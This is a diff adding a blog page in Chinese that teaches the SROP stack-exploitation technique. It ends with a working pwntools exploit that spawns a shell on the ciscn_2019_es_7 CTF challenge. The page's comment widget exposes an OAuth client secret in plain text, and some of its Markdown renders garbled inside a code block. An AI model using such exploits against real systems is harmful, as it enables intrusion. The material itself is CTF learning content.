@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    SROP |
+    
+    summerN&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="summerN's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-SROP" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SROP
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/04/28/SROP/" class="article-date">
+  <time datetime="2020-04-28T09:13:42.284Z" itemprop="datePublished">2020-04-28</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h1 id="栈溢出构造ROP之SROP"><a href="#栈溢出构造ROP之SROP" class="headerlink" title="栈溢出构造ROP之SROP"></a>栈溢出构造ROP之SROP</h1><a id="more"></a>
+
+<h2 id="原理即简介"><a href="#原理即简介" class="headerlink" title="原理即简介"></a>原理即简介</h2><p><code>sigreturn</code>是一个系统调用，在类unix系统发生signal的时候会被间接地调用。</p>
+<h3 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h3><p>signal机制是类unix系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用kill来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>
+<p><img src="https://wiki.x10sec.org/pwn/stackoverflow/figure/ProcessOfSignalHandlering.png" alt="Process of Signal Handlering"></p>
+<ol>
+<li><p>内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。</p>
+</li>
+<li><p>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址</strong>。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为Signal Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。</p>
+<p><img src="https://wiki.x10sec.org/pwn/stackoverflow/figure/signal2-stack.png" alt="signal2-stack"></p>
+<p>对于signal Frame来说，不同会因为架构的不同而因此有所区别，这里给出分别给出x86以及x64的sigcontext</p>
+<ul>
+<li>x86</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">struct sigcontext</span><br><span class="line">&#123;</span><br><span class="line">  unsigned short gs, __gsh;</span><br><span class="line">  unsigned short fs, __fsh;</span><br><span class="line">  unsigned short es, __esh;</span><br><span class="line">  unsigned short ds, __dsh;</span><br><span class="line">  unsigned long edi;</span><br><span class="line">  unsigned long esi;</span><br><span class="line">  unsigned long ebp;</span><br><span class="line">  unsigned long esp;</span><br><span class="line">  unsigned long ebx;</span><br><span class="line">  unsigned long edx;</span><br><span class="line">  unsigned long ecx;</span><br><span class="line">  unsigned long eax;</span><br><span class="line">  unsigned long trapno;</span><br><span class="line">  unsigned long err;</span><br><span class="line">  unsigned long eip;</span><br><span class="line">  unsigned short cs, __csh;</span><br><span class="line">  unsigned long eflags;</span><br><span class="line">  unsigned long esp_at_signal;</span><br><span class="line">  unsigned short ss, __ssh;</span><br><span class="line">  struct _fpstate * fpstate;</span><br><span class="line">  unsigned long oldmask;</span><br><span class="line">  unsigned long cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>x64</li>
+</ul>
+<ol>
+<li><pre><code>struct _fpstate
+{
+  /* FPU environment matching the 64-bit FXSAVE layout.  */
+  __uint16_t        cwd;
+  __uint16_t        swd;
+  __uint16_t        ftw;
+  __uint16_t        fop;
+  __uint64_t        rip;
+  __uint64_t        rdp;
+  __uint32_t        mxcsr;
+  __uint32_t        mxcr_mask;
+  struct _fpxreg    _st[8];
+  struct _xmmreg    _xmm[16];
+  __uint32_t        padding[24];
+};
+
+struct sigcontext
+{
+  __uint64_t r8;
+  __uint64_t r9;
+  __uint64_t r10;
+  __uint64_t r11;
+  __uint64_t r12;
+  __uint64_t r13;
+  __uint64_t r14;
+  __uint64_t r15;
+  __uint64_t rdi;
+  __uint64_t rsi;
+  __uint64_t rbp;
+  __uint64_t rbx;
+  __uint64_t rdx;
+  __uint64_t rax;
+  __uint64_t rcx;
+  __uint64_t rsp;
+  __uint64_t rip;
+  __uint64_t eflags;
+  unsigned short cs;
+  unsigned short gs;
+  unsigned short fs;
+  unsigned short __pad0;
+  __uint64_t err;
+  __uint64_t trapno;
+  __uint64_t oldmask;
+  __uint64_t cr2;
+  __extension__ union
+    {
+      struct _fpstate * fpstate;
+      __uint64_t __fpstate_word;
+    };
+  __uint64_t __reserved1 [8];
+};
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. signal handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。</span><br><span class="line"></span><br><span class="line">### 攻击原理</span><br><span class="line"></span><br><span class="line">仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：</span><br><span class="line"></span><br><span class="line">- Signal Frame被保存在用户的地址空间中，所以用户是可以读写的。</span><br><span class="line">- 由于内核与信号处理程序无关(kernel agnostic about signal  handlers)，它并不会去记录这个signal对应的Signal Frame，所以当执行sigreturn系统调用时，此时的Signal  Frame并不一定是之前内核为用户进程保存的Signal Frame。</span><br><span class="line"></span><br><span class="line">说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。</span><br><span class="line"></span><br><span class="line">### 获取shell</span><br><span class="line"></span><br><span class="line">首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息</span><br><span class="line"></span><br><span class="line">![signal2-stack](https:&#x2F;&#x2F;wiki.x10sec.org&#x2F;pwn&#x2F;stackoverflow&#x2F;figure&#x2F;srop-example-1.png)</span><br><span class="line"></span><br><span class="line">当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。</span><br><span class="line"></span><br><span class="line">#### system call chains[¶](https:&#x2F;&#x2F;wiki.x10sec.org&#x2F;pwn&#x2F;stackoverflow&#x2F;advanced_rop&#x2F;#system-call-chains)</span><br><span class="line"></span><br><span class="line">需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</span><br><span class="line"></span><br><span class="line">- **控制栈指针。**</span><br><span class="line">- **把原来rip指向的&#96;syscall&#96; gadget换成&#96;syscall; ret&#96; gadget。**</span><br><span class="line"></span><br><span class="line">如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的sigreturn函数调用。</span><br><span class="line"></span><br><span class="line">![signal2-stack](https:&#x2F;&#x2F;wiki.x10sec.org&#x2F;pwn&#x2F;stackoverflow&#x2F;figure&#x2F;srop-example-2.png)</span><br><span class="line"></span><br><span class="line">#### 后续[¶](https:&#x2F;&#x2F;wiki.x10sec.org&#x2F;pwn&#x2F;stackoverflow&#x2F;advanced_rop&#x2F;#_9)</span><br><span class="line"></span><br><span class="line">需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件</span><br><span class="line"></span><br><span class="line">- **可以通过栈溢出来控制栈的内容**</span><br><span class="line">- 需要知道相应的地址</span><br><span class="line">  - **&quot;&#x2F;bin&#x2F;sh&quot;**</span><br><span class="line">  - **Signal Frame**</span><br><span class="line">  - **syscal**</span><br><span class="line">  - **sigreturn**</span><br><span class="line">- 需要有够大的空间来塞下整个sigal frame</span><br><span class="line"></span><br><span class="line">此外，关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：</span><br><span class="line"></span><br><span class="line">![gadget1](https:&#x2F;&#x2F;wiki.x10sec.org&#x2F;pwn&#x2F;stackoverflow&#x2F;figure&#x2F;srop-gadget-1.png)</span><br><span class="line"></span><br><span class="line">并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说&#96;Linux &lt; 3.3 x86_64&#96;（在Debian 7.0， Ubuntu Long Term Support， CentOS 6系统中默认内核），可以直接在vsyscall中的固定地址处找到syscall&amp;return代码片段。如下</span><br><span class="line"></span><br><span class="line">![gadget1](https:&#x2F;&#x2F;wiki.x10sec.org&#x2F;pwn&#x2F;stackoverflow&#x2F;figure&#x2F;srop-gadget-2.png)</span><br><span class="line"></span><br><span class="line">但是目前它已经被&#96;vsyscall-emulate&#96;和&#96;vdso&#96;机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。</span><br><span class="line"></span><br><span class="line">值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX&#x3D;15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。</span><br><span class="line"></span><br><span class="line">### </span><br><span class="line"></span><br><span class="line">**值得一提的是，在目前的pwntools中已经集成了对于srop的攻击。**</span><br><span class="line"></span><br><span class="line">## 我的理解：</span><br><span class="line"></span><br><span class="line">1、在没有任何可以泄露libc或者可以用于rop的函数时，且存在系统调用，这时我们可以考虑使用SROP</span><br><span class="line"></span><br><span class="line">### 条件</span><br><span class="line"></span><br><span class="line">1、想要触发我们构造的signal frame，需要在执行syscall后我们，构造的signal frame位于栈顶的位置</span><br><span class="line"></span><br><span class="line">2、在我们触发syscall之前，要将eax寄存器的值变为</span><br><span class="line"></span><br><span class="line">32位的sigreturn的调用号为77，64位的系统调用号为15。</span><br><span class="line"></span><br><span class="line">3、如果我们想执行完一个signal frame后在进行继续，只需将我们的rsp修改为对应位置的地址即可</span><br><span class="line"></span><br><span class="line">4、注意调试</span><br><span class="line"></span><br><span class="line">## 例题：ciscn_2019_es_7</span><br><span class="line"></span><br><span class="line">64位程序，只有系统调用存在，有signturn的后门，即存在使eax赋值的指令</span><br><span class="line"></span><br><span class="line">具体解释在exp中：</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2</span><br><span class="line">#encoding:utf-8</span><br><span class="line">#__author__&#x3D;&#39;summerN@DL&amp;S&#39;</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">file_name &#x3D; &#39;.&#x2F;1&#39;</span><br><span class="line">libc_name &#x3D; &#39;&#39;</span><br><span class="line">ip &#x3D; &#39;node3.buuoj.cn&#39;</span><br><span class="line">port &#x3D; &#39;25359&#39;</span><br><span class="line">context.arch &#x3D; &#39;amd64&#39;</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.terminal&#x3D;[&#39;tmux&#39;,&#39;split&#39;,&#39;-h&#39;]</span><br><span class="line">#libc &#x3D; ELF(libc_name)</span><br><span class="line">elf &#x3D; ELF(file_name)</span><br><span class="line">#p &#x3D; process(file_name)</span><br><span class="line">p &#x3D; remote(ip,port)</span><br><span class="line">read_add &#x3D;0x4004f1</span><br><span class="line">start_add &#x3D;0x4004ed</span><br><span class="line">syscall_add &#x3D;0x400517</span><br><span class="line">signturn_back &#x3D;0x4004DA</span><br><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh&#39;+&quot;\x00&quot;*9+ p64(read_add)#调用完vuln函数后回到调用read处</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recv(32)</span><br><span class="line">stack_add&#x3D;u64(p.recv(8))</span><br><span class="line">log.success(&quot;stack_add:&quot; +hex(stack_add))#这里获取的是main主函数的栈地址，从汇编上可以看到，在调用                                          vuln函数之前值push了rbp</span><br><span class="line">										 #因此ret地址后面的就为rbp(rbp存放着栈地址)</span><br><span class="line">p.recv(8)#从汇编上看write函数只是打印了0x30个字符，所以这是最后8个</span><br><span class="line">#构造srop</span><br><span class="line">sigframe &#x3D; SigreturnFrame()#这里是pwntools集成的堆srop的应用</span><br><span class="line">sigframe.rax &#x3D; constants.SYS_execve</span><br><span class="line">sigframe.rdi &#x3D; stack_add - 280  # &quot;&#x2F;bin&#x2F;sh&quot; &#39;s addr #通过调试计算得到</span><br><span class="line">sigframe.rsi &#x3D; 0x0</span><br><span class="line">sigframe.rdx &#x3D; 0x0</span><br><span class="line">sigframe.rsp &#x3D; stack_add</span><br><span class="line">sigframe.rip &#x3D; syscall_add</span><br><span class="line">payload1 &#x3D; &#39;&#x2F;bin&#x2F;sh&#x2F;&#39; + &#39;\x00&#39; * 8 + p64(signturn_back) + p64(syscall_add) + str(sigframe)</span><br><span class="line">#这里我有点地方不懂，经过调试但就是这样，如果字符串填满后，我们的signturn_back的低两字节就会为00，相当于我们传入的地址往前移动了两位，地址错误，无法getshell，具体是为啥我也不知道</span><br><span class="line">#这里之所以是&#39;\x00&#39; * 8 而不是多加个8，是因为，汇编：rsi, [rsp+buf] 这个buf是固定的相对于rbp位置的偏移，因此输入的地方少了8个字符</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</code></pre></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://summern.club/2020/04/28/SROP/" data-id="ck9jp1esw0003e0ludfc2fz0z"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/04/21/%E8%99%8E%E7%AC%A6%E9%83%A8%E5%88%86pwn/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">虎符部分pwn</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '665e1db541e975225bc6',
+      clientSecret: '525f3534fe6005375cf8c02330ed09a2b7aab7d5',
+      repo: 'talk',
+      owner: 'summerN',
+      admin: ['summerN'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 summerN&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="summerN&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
